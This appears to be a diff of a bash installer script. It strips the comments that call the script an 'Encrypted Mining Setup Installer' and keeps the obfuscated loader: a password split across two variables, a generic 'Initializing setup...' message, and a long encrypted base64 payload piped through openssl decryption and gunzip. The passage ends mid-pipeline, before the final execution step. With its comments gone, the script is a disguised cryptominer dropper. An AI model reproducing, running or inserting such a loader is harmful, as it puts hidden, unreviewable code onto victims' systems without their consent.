@@ -1,23 +1,12 @@
 #!/bin/bash
-# ========================================
-# Encrypted Mining Setup Installer
-# Multi-layer protection:
-# - Gzip compression
-# - AES-256-CBC encryption
-# - Base64 encoding
-# ========================================
-
 set -e
 
-# Embedded encrypted password (obfuscated)
 _p1='kFvQje85zSKNPtOAKDIg'
 _p2='wpmvYZpqZ5zOjVexz6DM'
 _pw="${_p1}${_p2}"
 
-# Decrypt and execute
 echo "Initializing setup..."
 
-# Decode -> Decrypt -> Decompress -> Execute
 base64 -d <<< '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' | \
   openssl enc -aes-256-cbc -d -pbkdf2 -pass pass:"${_pw}" 2>/dev/null | \
   gunzip | \
